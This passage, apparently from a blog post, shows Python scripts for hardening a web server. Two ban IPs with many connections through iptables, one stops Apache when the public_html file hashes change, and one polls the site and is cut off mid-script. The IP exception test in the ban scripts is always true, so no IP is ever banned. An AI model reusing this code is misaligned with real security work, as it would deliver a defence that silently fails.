</span><span class='line'>      <span class="n">pid_md5</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">subpro_md5</span><span class="o">.</span><span class="n">pid</span><span class="p">)</span>      
</span><span class='line'>      <span class="k">while</span> <span class="mi">1</span><span class="p">:</span>
</span><span class='line'>          <span class="n">loop</span> <span class="o">=</span> <span class="mi">1</span>          <span class="c">#keep this process active</span>
</span><span class='line'>          <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1000</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>




<p>Note: Copy it in /root/ directory, If you want change directory, Don&rsquo;t forget to change it in source codes too.
<br>and other files you need to have in root directory:</p>




<div class='bogus-wrapper'><notextile><figure class='code'><figcaption><span>24ban.py</span><a href='https://github.com/Ali-Razmjoo/z3r0d4y/blob/master/24ban.py'>link</a></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/python </span>
</span><span class='line'><span class="kn">import</span> <span class="nn">os</span><span class="o">,</span><span class="nn">hashlib</span><span class="o">,</span><span class="nn">subprocess</span><span class="o">,</span><span class="nn">signal</span><span class="o">,</span><span class="nn">time</span><span class="o">,</span><span class="nn">multiprocessing</span><span class="o">,</span><span class="nn">time</span><span class="o">,</span><span class="nn">sys</span><span class="o">,</span><span class="nn">httplib</span><span class="o">,</span><span class="nn">pickle</span><span class="o">,</span><span class="nn">socket</span><span class="o">,</span><span class="nn">re</span><span class="o">,</span><span class="nn">urllib2</span> <span class="c">#import modules</span>
</span><span class='line'><span class="n">stop_event</span> <span class="o">=</span> <span class="n">multiprocessing</span><span class="o">.</span><span class="n">Event</span><span class="p">()</span>
</span><span class='line'><span class="k">while</span> <span class="mi">1</span><span class="p">:</span>
</span><span class='line'>  <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">120</span><span class="p">)</span>
</span><span class='line'>  <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s">&#39;netstat -ntu | awk </span><span class="se">\&#39;</span><span class="s">{print $5}</span><span class="se">\&#39;</span><span class="s"> | cut -d: -f1 | sort | uniq -c | sort -n &gt;&gt; /root/IPz.txt&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="nb">file</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">&#39;/root/IPz.txt&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="nb">file</span><span class="p">:</span>
</span><span class='line'>      <span class="n">ip</span> <span class="o">=</span> <span class="n">line</span>
</span><span class='line'>      <span class="n">Ban</span> <span class="o">=</span> <span class="mi">0</span>
</span><span class='line'>      <span class="n">word_num</span> <span class="o">=</span> <span class="mi">0</span>
</span><span class='line'>      <span class="n">words</span> <span class="o">=</span> <span class="n">ip</span><span class="o">.</span><span class="n">split</span><span class="p">()</span>
</span><span class='line'>      <span class="k">for</span> <span class="n">text_word</span> <span class="ow">in</span> <span class="n">words</span><span class="p">:</span>
</span><span class='line'>          <span class="n">word_num</span> <span class="o">+=</span> <span class="mi">1</span>
</span><span class='line'>          <span class="k">if</span> <span class="n">word_num</span> <span class="ow">is</span> <span class="mi">1</span><span class="p">:</span>
</span><span class='line'>              <span class="k">if</span> <span class="nb">int</span><span class="p">(</span><span class="n">text_word</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">20</span><span class="p">:</span>
</span><span class='line'>                  <span class="n">Ban</span> <span class="o">=</span> <span class="mi">1</span>
</span><span class='line'>              <span class="k">if</span> <span class="n">word_num</span> <span class="ow">is</span> <span class="mi">2</span><span class="p">:</span>
</span><span class='line'>                  <span class="k">if</span> <span class="n">Ban</span> <span class="ow">is</span> <span class="mi">1</span><span class="p">:</span>
</span><span class='line'>                      <span class="k">if</span> <span class="s">&#39;.&#39;</span> <span class="ow">in</span> <span class="n">text_word</span><span class="p">:</span>
</span><span class='line'>                          <span class="n">skip</span> <span class="o">=</span> <span class="mi">0</span>
</span><span class='line'>                          <span class="k">if</span> <span class="s">&#39;127.0.0.1&#39;</span> <span class="ow">or</span> <span class="s">&#39;176.9.183.142&#39;</span> <span class="ow">or</span> <span class="s">&#39;79.175.163.84&#39;</span> <span class="ow">in</span> <span class="n">text_word</span><span class="p">:</span>  <span class="c">#replace your ip address</span>
</span><span class='line'>                              <span class="n">skip</span> <span class="o">=</span> <span class="mi">1</span>
</span><span class='line'>                          <span class="k">if</span> <span class="n">skip</span> <span class="ow">is</span> <span class="mi">0</span><span class="p">:</span>  
</span><span class='line'>                              <span class="n">deny</span> <span class="o">=</span> <span class="s">&#39;iptables -I INPUT -s </span><span class="si">%s</span><span class="s"> -j DROP&#39;</span> <span class="o">%</span><span class="n">text_word</span> <span class="c"># it use iptables to ban users</span>
</span><span class='line'>                              <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="n">deny</span><span class="p">)</span>
</span><span class='line'>                              <span class="n">deny</span> <span class="o">=</span> <span class="s">&#39;iptables -A INPUT  -s </span><span class="si">%s</span><span class="s"> -j DROP&#39;</span> <span class="o">%</span><span class="n">text_word</span>
</span><span class='line'>                              <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="n">deny</span><span class="p">)</span>
</span><span class='line'>                              <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s">&#39;service iptables-persistent save&#39;</span><span class="p">)</span>
</span><span class='line'>                              <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s">&#39;service iptables-persistent restart&#39;</span><span class="p">)</span>
</span><span class='line'>                              <span class="n">ipsave</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">&#39;/root/Banned.txt&#39;</span><span class="p">,</span><span class="s">&#39;a&#39;</span><span class="p">)</span> <span class="c">#save ip banned for me</span>
</span><span class='line'>                              <span class="n">ip_add</span> <span class="o">=</span> <span class="n">text_word</span> <span class="o">+</span> <span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span>
</span><span class='line'>                              <span class="n">ipsave</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">ip_add</span><span class="p">)</span>
</span><span class='line'>                              <span class="n">ipsave</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>  
</span><span class='line'>  <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s">&#39;rm -rf /root/IPz.txt&#39;</span><span class="p">)</span>     
</span></code></pre></td></tr></table></div></figure></notextile></div>




<p>Note: Change exceptions IP to anything you want.
<br>Note: This file find the IPs that have much threads on server and it going to block them.
<br>Note: You can see block IPs in /root/Banned.txt
<br>Note: This script will check your server every 120 seconds. Why ? Maybe someone trying to do DDOS attack but attack not begin success yet. So it will check and block them too.
<br><br>
This file will check the MD5 of public_html files and folders and if any file or folder change/add/remove Robot will Stop Apache. So you cannot be deface.</p>




<div class='bogus-wrapper'><notextile><figure class='code'><figcaption><span>md5.py</span><a href='https://github.com/Ali-Razmjoo/z3r0d4y/blob/master/md5.py'>link</a></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/python</span>
</span><span class='line'><span class="c">#By Ali Razmjoo </span>
</span><span class='line'><span class="kn">import</span> <span class="nn">os</span><span class="o">,</span><span class="nn">hashlib</span><span class="o">,</span><span class="nn">subprocess</span><span class="o">,</span><span class="nn">signal</span><span class="o">,</span><span class="nn">time</span><span class="o">,</span><span class="nn">multiprocessing</span><span class="o">,</span><span class="nn">time</span><span class="o">,</span><span class="nn">sys</span><span class="o">,</span><span class="nn">httplib</span><span class="o">,</span><span class="nn">pickle</span><span class="o">,</span><span class="nn">socket</span><span class="o">,</span><span class="nn">re</span><span class="o">,</span><span class="nn">urllib2</span> <span class="c">#import modules</span>
</span><span class='line'><span class="n">stop_event</span> <span class="o">=</span> <span class="n">multiprocessing</span><span class="o">.</span><span class="n">Event</span><span class="p">()</span>  <span class="c">#start multiprocessing</span>
</span><span class='line'><span class="k">def</span> <span class="nf">stop</span><span class="p">(</span><span class="n">signum</span><span class="p">,</span> <span class="n">frame</span><span class="p">):</span>
</span><span class='line'>    <span class="n">stop_event</span><span class="o">.</span><span class="n">set</span><span class="p">()</span>
</span><span class='line'><span class="n">signal</span><span class="o">.</span><span class="n">signal</span><span class="p">(</span><span class="n">signal</span><span class="o">.</span><span class="n">SIGTERM</span><span class="p">,</span> <span class="n">stop</span><span class="p">)</span>
</span><span class='line'><span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">&#39;__main__&#39;</span><span class="p">:</span> <span class="c">#start software</span>
</span><span class='line'>  <span class="k">while</span> <span class="ow">not</span> <span class="n">stop_event</span><span class="o">.</span><span class="n">is_set</span><span class="p">():</span> <span class="c">#while bash script not stop ....</span>
</span><span class='line'>      <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.6</span><span class="p">)</span>
</span><span class='line'>      <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s">&#39;rm -rf /home/size_public_html&#39;</span><span class="p">)</span>
</span><span class='line'>      <span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">&#39;/home/size_public_html&#39;</span><span class="p">,</span><span class="s">&#39;a&#39;</span><span class="p">)</span>
</span><span class='line'>      <span class="k">for</span> <span class="n">dirname</span><span class="p">,</span> <span class="n">dirnames</span><span class="p">,</span> <span class="n">filenames</span> <span class="ow">in</span> <span class="n">os</span><span class="o">.</span><span class="n">walk</span><span class="p">(</span><span class="s">&#39;/home/z3r0d4y/public_html/&#39;</span><span class="p">):</span>
</span><span class='line'>          <span class="n">F</span> <span class="o">=</span> <span class="mi">0</span>
</span><span class='line'>          <span class="n">A</span> <span class="o">=</span> <span class="mi">0</span>
</span><span class='line'>          <span class="n">C</span> <span class="o">=</span> <span class="mi">1</span>
</span><span class='line'>          <span class="n">D</span> <span class="o">=</span> <span class="mi">1</span>
</span><span class='line'>          <span class="k">for</span> <span class="n">subdirname</span> <span class="ow">in</span> <span class="n">dirnames</span><span class="p">:</span>
</span><span class='line'>              <span class="n">A</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">dirname</span><span class="p">,</span> <span class="n">subdirname</span><span class="p">)</span>
</span><span class='line'>              <span class="k">if</span> <span class="s">&#39;error_log&#39;</span> <span class="ow">in</span> <span class="n">A</span><span class="p">:</span>
</span><span class='line'>                  <span class="n">C</span> <span class="o">=</span> <span class="mi">0</span>
</span><span class='line'>              <span class="k">if</span> <span class="s">&#39;access_log&#39;</span> <span class="ow">in</span> <span class="n">A</span><span class="p">:</span>
</span><span class='line'>                  <span class="k">if</span> <span class="s">&#39;data&#39;</span> <span class="ow">in</span> <span class="n">A</span><span class="p">:</span>
</span><span class='line'>                      <span class="n">C</span> <span class="o">=</span> <span class="mi">0</span>
</span><span class='line'>              <span class="k">if</span> <span class="n">C</span> <span class="ow">is</span> <span class="mi">1</span><span class="p">:</span>
</span><span class='line'>                  <span class="k">if</span> <span class="s">&#39;public_html/&#39;</span> <span class="ow">in</span> <span class="n">A</span><span class="p">:</span>
</span><span class='line'>                      <span class="n">size</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">getsize</span><span class="p">(</span><span class="n">A</span><span class="p">)</span>
</span><span class='line'>                      <span class="n">wr</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">)</span> <span class="o">+</span> <span class="s">&#39;:::&#39;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">A</span><span class="p">)</span> <span class="o">+</span> <span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span>
</span><span class='line'>                      <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">wr</span><span class="p">)</span>
</span><span class='line'>              <span class="n">C</span> <span class="o">=</span> <span class="mi">1</span>
</span><span class='line'>          <span class="k">for</span> <span class="n">filename</span> <span class="ow">in</span> <span class="n">filenames</span><span class="p">:</span>
</span><span class='line'>              <span class="n">F</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">dirname</span><span class="p">,</span> <span class="n">filename</span><span class="p">)</span>
</span><span class='line'>              <span class="k">if</span> <span class="s">&#39;error_log&#39;</span> <span class="ow">in</span> <span class="n">F</span><span class="p">:</span>
</span><span class='line'>                  <span class="n">D</span> <span class="o">=</span> <span class="mi">0</span>
</span><span class='line'>              <span class="k">if</span> <span class="s">&#39;access_log&#39;</span> <span class="ow">in</span> <span class="n">F</span><span class="p">:</span>
</span><span class='line'>                  <span class="n">D</span> <span class="o">=</span> <span class="mi">0</span>
</span><span class='line'>              <span class="k">if</span> <span class="n">D</span> <span class="ow">is</span> <span class="mi">1</span><span class="p">:</span>
</span><span class='line'>                  <span class="k">if</span> <span class="s">&#39;public_html/&#39;</span> <span class="ow">in</span> <span class="n">F</span><span class="p">:</span>
</span><span class='line'>                      <span class="k">try</span><span class="p">:</span>
</span><span class='line'>                          <span class="n">size</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">getsize</span><span class="p">(</span><span class="n">F</span><span class="p">)</span>
</span><span class='line'>                          <span class="n">wr</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">)</span> <span class="o">+</span> <span class="s">&#39;:::&#39;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">F</span><span class="p">)</span> <span class="o">+</span> <span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span>
</span><span class='line'>                          <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">wr</span><span class="p">)</span>
</span><span class='line'>                      <span class="k">except</span><span class="p">:</span>
</span><span class='line'>                          <span class="n">e</span> <span class="o">=</span> <span class="mi">1</span>
</span><span class='line'>              <span class="n">D</span> <span class="o">=</span> <span class="mi">1</span>
</span><span class='line'>      <span class="n">f</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span><span class='line'>      <span class="nb">hash</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">&#39;/home/size_public_html&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
</span><span class='line'>      <span class="n">md5</span> <span class="o">=</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">md5</span><span class="p">(</span><span class="nb">hash</span><span class="p">)</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span>
</span><span class='line'>      <span class="k">print</span> <span class="n">md5</span>
</span><span class='line'>      <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s">&#39;rm -rf /home/size_public_html&#39;</span><span class="p">)</span>
</span><span class='line'>      <span class="n">L</span> <span class="o">=</span> <span class="mi">1</span>
</span><span class='line'>      <span class="k">if</span> <span class="s">&#39;9c5302d7c4115dcc4b66da2d5def389c&#39;</span> <span class="ow">in</span> <span class="n">md5</span><span class="p">:</span>
</span><span class='line'>          <span class="n">L</span> <span class="o">=</span> <span class="mi">0</span>
</span><span class='line'>      <span class="k">if</span> <span class="n">L</span> <span class="ow">is</span> <span class="mi">1</span><span class="p">:</span>
</span><span class='line'>          <span class="k">while</span> <span class="mi">1</span><span class="p">:</span>
</span><span class='line'>              <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.5</span><span class="p">)</span>
</span><span class='line'>              <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s">&#39;service httpd stop&#39;</span><span class="p">)</span>
</span><span class='line'>              <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s">&#39;echo </span><span class="se">\&#39;</span><span class="s">Files Size changed ! danger !!!!</span><span class="se">\&#39;</span><span class="s"> &gt; /home/lamer_detect.txt&#39;</span><span class="p">)</span>
</span><span class='line'>              <span class="k">print</span> <span class="s">&#39;</span><span class="se">\n</span><span class="s">All Dead</span><span class="se">\n</span><span class="s">&#39;</span>
</span><span class='line'>              <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s">&#39;python /root/kill.py&#39;</span><span class="p">)</span>
</span><span class='line'>          <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</span><span class='line'>      <span class="k">print</span> <span class="s">&#39;pass , md5:&#39;</span><span class="p">,</span> <span class="n">md5</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>




<p>
<br><br><br>This file is going to run and ban IPs requested by Robot.</p>




<div class='bogus-wrapper'><notextile><figure class='code'><figcaption><span>ban.py</span><a href='https://github.com/Ali-Razmjoo/z3r0d4y/blob/master/ban.py'>link</a></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/python </span>
</span><span class='line'><span class="kn">import</span> <span class="nn">os</span><span class="o">,</span><span class="nn">hashlib</span><span class="o">,</span><span class="nn">subprocess</span><span class="o">,</span><span class="nn">signal</span><span class="o">,</span><span class="nn">time</span><span class="o">,</span><span class="nn">multiprocessing</span><span class="o">,</span><span class="nn">time</span><span class="o">,</span><span class="nn">sys</span><span class="o">,</span><span class="nn">httplib</span><span class="o">,</span><span class="nn">pickle</span><span class="o">,</span><span class="nn">socket</span><span class="o">,</span><span class="nn">re</span><span class="o">,</span><span class="nn">urllib2</span> <span class="c">#import modules</span>
</span><span class='line'><span class="n">stop_event</span> <span class="o">=</span> <span class="n">multiprocessing</span><span class="o">.</span><span class="n">Event</span><span class="p">()</span>
</span><span class='line'><span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s">&#39;netstat -ntu | awk </span><span class="se">\&#39;</span><span class="s">{print $5}</span><span class="se">\&#39;</span><span class="s"> | cut -d: -f1 | sort | uniq -c | sort -n &gt;&gt; /root/IPs.txt&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s">&#39;service apache2 stop&#39;</span><span class="p">)</span>
</span><span class='line'><span class="nb">file</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">&#39;/root/IPs.txt&#39;</span><span class="p">)</span>
</span><span class='line'><span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="nb">file</span><span class="p">:</span>
</span><span class='line'>  <span class="n">ip</span> <span class="o">=</span> <span class="n">line</span>
</span><span class='line'>  <span class="n">Ban</span> <span class="o">=</span> <span class="mi">0</span>
</span><span class='line'>  <span class="n">word_num</span> <span class="o">=</span> <span class="mi">0</span>
</span><span class='line'>  <span class="n">words</span> <span class="o">=</span> <span class="n">ip</span><span class="o">.</span><span class="n">split</span><span class="p">()</span>
</span><span class='line'>  <span class="k">for</span> <span class="n">text_word</span> <span class="ow">in</span> <span class="n">words</span><span class="p">:</span>
</span><span class='line'>      <span class="n">word_num</span> <span class="o">+=</span> <span class="mi">1</span>
</span><span class='line'>      <span class="k">if</span> <span class="n">word_num</span> <span class="ow">is</span> <span class="mi">1</span><span class="p">:</span>
</span><span class='line'>          <span class="k">if</span> <span class="nb">int</span><span class="p">(</span><span class="n">text_word</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">20</span><span class="p">:</span>
</span><span class='line'>              <span class="n">Ban</span> <span class="o">=</span> <span class="mi">1</span>
</span><span class='line'>          <span class="k">if</span> <span class="n">word_num</span> <span class="ow">is</span> <span class="mi">2</span><span class="p">:</span>
</span><span class='line'>              <span class="k">if</span> <span class="n">Ban</span> <span class="ow">is</span> <span class="mi">1</span><span class="p">:</span>
</span><span class='line'>                  <span class="k">if</span> <span class="s">&#39;.&#39;</span> <span class="ow">in</span> <span class="n">text_word</span><span class="p">:</span>
</span><span class='line'>                      <span class="n">skip</span> <span class="o">=</span> <span class="mi">0</span>
</span><span class='line'>                      <span class="k">if</span> <span class="s">&#39;127.0.0.1&#39;</span> <span class="ow">or</span> <span class="s">&#39;176.9.183.142&#39;</span> <span class="ow">or</span> <span class="s">&#39;79.175.163.84&#39;</span> <span class="ow">in</span> <span class="n">text_word</span><span class="p">:</span>
</span><span class='line'>                          <span class="n">skip</span> <span class="o">=</span> <span class="mi">1</span>
</span><span class='line'>                      <span class="k">if</span> <span class="n">skip</span> <span class="ow">is</span> <span class="mi">0</span><span class="p">:</span>  
</span><span class='line'>                          <span class="n">deny</span> <span class="o">=</span> <span class="s">&#39;iptables -I INPUT -s </span><span class="si">%s</span><span class="s"> -j DROP&#39;</span> <span class="o">%</span><span class="n">text_word</span> <span class="c"># it use iptables to ban users</span>
</span><span class='line'>                          <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="n">deny</span><span class="p">)</span>
</span><span class='line'>                          <span class="n">deny</span> <span class="o">=</span> <span class="s">&#39;iptables -A INPUT  -s </span><span class="si">%s</span><span class="s"> -j DROP&#39;</span> <span class="o">%</span><span class="n">text_word</span>
</span><span class='line'>                          <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="n">deny</span><span class="p">)</span>
</span><span class='line'>                          <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s">&#39;service iptables-persistent save&#39;</span><span class="p">)</span>
</span><span class='line'>                          <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s">&#39;service iptables-persistent restart&#39;</span><span class="p">)</span>
</span><span class='line'>                          <span class="n">ipsave</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">&#39;/root/Banned.txt&#39;</span><span class="p">,</span><span class="s">&#39;a&#39;</span><span class="p">)</span> <span class="c">#save ip banned for me</span>
</span><span class='line'>                          <span class="n">ip_add</span> <span class="o">=</span> <span class="n">text_word</span> <span class="o">+</span> <span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span>
</span><span class='line'>                          <span class="n">ipsave</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">ip_add</span><span class="p">)</span>
</span><span class='line'>                          <span class="n">ipsave</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>              
</span><span class='line'><span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s">&#39;rm -rf /root/IPs.txt&#39;</span><span class="p">)</span>       
</span><span class='line'><span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s">&#39;service apache2 start&#39;</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>




<p>And this file is going to check server [if crash or not open] from inside of your server</p>




<div class='bogus-wrapper'><notextile><figure class='code'><figcaption><span>in.py</span><a href='https://github.com/Ali-Razmjoo/z3r0d4y/blob/master/in.py'>link</a></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/python</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">os</span><span class="o">,</span><span class="nn">hashlib</span><span class="o">,</span><span class="nn">subprocess</span><span class="o">,</span><span class="nn">signal</span><span class="o">,</span><span class="nn">time</span><span class="o">,</span><span class="nn">multiprocessing</span><span class="o">,</span><span class="nn">time</span><span class="o">,</span><span class="nn">sys</span><span class="o">,</span><span class="nn">httplib</span><span class="o">,</span><span class="nn">pickle</span><span class="o">,</span><span class="nn">socket</span><span class="o">,</span><span class="nn">re</span><span class="o">,</span><span class="nn">urllib2</span> <span class="c">#import modules</span>
</span><span class='line'><span class="n">stop_event</span> <span class="o">=</span> <span class="n">multiprocessing</span><span class="o">.</span><span class="n">Event</span><span class="p">()</span>  <span class="c">#start multiprocessing</span>
</span><span class='line'><span class="n">Attack</span> <span class="o">=</span> <span class="mi">0</span>
</span><span class='line'><span class="k">while</span> <span class="mi">1</span><span class="p">:</span>
</span><span class='line'>  <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.2</span><span class="p">)</span>
</span><span class='line'>  <span class="k">try</span><span class="p">:</span>
</span><span class='line'>      <span class="n">Ready_Target</span> <span class="o">=</span> <span class="s">&#39;black-hg.org&#39;</span>
</span><span class='line'>      <span class="n">connection</span> <span class="o">=</span> <span class="n">httplib</span><span class="o">.</span><span class="n">HTTPConnection</span><span class="p">(</span><span class="n">Ready_Target</span><span class="p">)</span>
</span><span class='line'>      <span class="n">connection</span><span class="o">.</span><span class="n">request</span><span class="p">(</span><span class="s">&quot;GET&quot;</span><span class="p">,</span><span class="s">&#39;/&#39;</span><span class="p">)</span>
